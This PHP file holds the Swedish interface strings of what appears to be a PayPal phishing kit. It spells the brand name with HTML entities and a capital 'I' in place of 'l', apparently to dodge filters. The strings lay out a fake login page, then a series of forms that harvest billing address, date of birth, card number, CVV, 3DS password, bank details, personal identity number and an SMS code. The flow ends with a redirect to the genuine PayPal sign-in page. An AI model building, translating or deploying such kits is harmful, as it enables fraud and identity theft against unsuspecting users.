<?php 
//LOG
$log_ttl1="&#80;&#97;y&#80;&#97;I konto Uppdatering";
$log_ttl2="Secure";
$log_lab1="&#80;&#97;y&#80;&#97;I Page Secure";
$log_lab2="Logga in på ditt konto";
$log_em="e-post";
$log_ps="lösenord";
$log_frg="Glömt din e-postadress eller lösenord ?";
$log_btn="Log In";
//FTR
$ftr_01="Respekt för privatlivet";
$ftr_02="Juridiska avtal";
$ftr_03="Kontakt";
$ftr_04="Hjälp";
//INF
$inf_scr="Din säkerhet är vår högsta prioritet";
$inf_ttspan="Kontoinformation Uppdatering";
$inf_lab1="Uppdatera din faktureringsadress";
$inf_corr="Ange din faktureringsadress korrekt.";
$inf_frnm="Ditt Förnamn";
$inf_lsnm="Ditt efternamn";
$inf_dob="Datum Födelsedag DD/MM/YYYY";
$inf_add="Gatuadress";
$inf_cty="stad/ort";
$inf_stt="Stad";
$inf_cnt="Land";
$inf_zip="postnummer";
$inf_mob="Mobil";
$inf_hom="Hem";
$inf_pho="telefonnummer";
$inf_con="fortsätta";
//CRD
$crd_ttspan="Kortet Information Uppdatering";
$crd_lab1="Uppdatera din kredit / bankkort";
$crd_corr="Ange din kredit- / betalkortsinformation korrekt.";
$crd_crdh="Korthållare";
$crd_crdn="kortnummer";
$crd_expd="Utgångsdatum MM/YY";
$crd_cv="CSC / CVV";
$crd_ttcv="Ange verifierings kodkort visas på ditt kort";
$crd_ptcv="./scr/csc";
$crd_wtcv="Vad är CSC koden ?";
$crd_ttptcv="Kort verifikationskod - Help";
$crd_cvp="CVV (eller Card Verification Value) är en anti-bedrägeri säkerhetsfunktion som kontrollerar om kreditkortet är i din ägo. För Visa / Mastercard , CVV tresiffrigt nummer tryckt på signaturfältet på baksidan av kortet efter kontonummer. För American Express, är det fyrsiffriga CVV nummer tryckt på framsidan av kortet över kontonumret";
$crd_cvtd1="Det finns ett antal av 3 siffror i kursiv stil inverterade på baksidan av kreditkortet .";
$crd_cvtd2="Det är en 4-siffrigt nummer på framsidan av bilarna, precis ovanför kreditkortsnumret .";
$crd_cvfrm="Stänga";
$crd_pcptcv="../../lyl_ims/cv.png";
$crd_3ds="3DS VBV/MSC lösenord";
$crd_acc="kontonummer";
$crd_sn="Personnummer";
$crd_ttsn="Personnummer";
$crd_srt="Sort code";
$crd_ttptsrt="Sort code - Help";
$crd_ptsrt="./scr/srt/";
$crd_pcsrt="../../lyl_ims/srt.png";
$crd_btn="fortsätta";
//PIN
$bnk_ttspan="Processverifiering av konton";
$bnk_lab1="Processverifiering av konton.";
$bnk_yrbn="Verifiering per telefon:";
$bnk_corr="Bekräfta dig själv genom att ange bekräftelsekoden du fick på din telefon och klicka sedan på 'Bekräfta nu'";
$bnk_rt="Ange bekräftelsekoden här";
$inc_pin="Du har angett fel bekräftelsekod, försök igen.";
$bnk_bt="Bekräfta nu";
//SCS
$scs_ttspan="framgångsrik uppdatering";
$scs_lnk="https://www.paypal.com/signin/";
$scs_tnk="Tack";
$scs_yrp="Ditt PayPaI-konto har uppdaterats.";
$scs_yhv="Du måste logga in igen för att spara ändringarna, du kommer att omdirigeras automatiskt till inloggningssidan i 3 sekunder ... Tack för att du använder vårt system verifiering.";
?>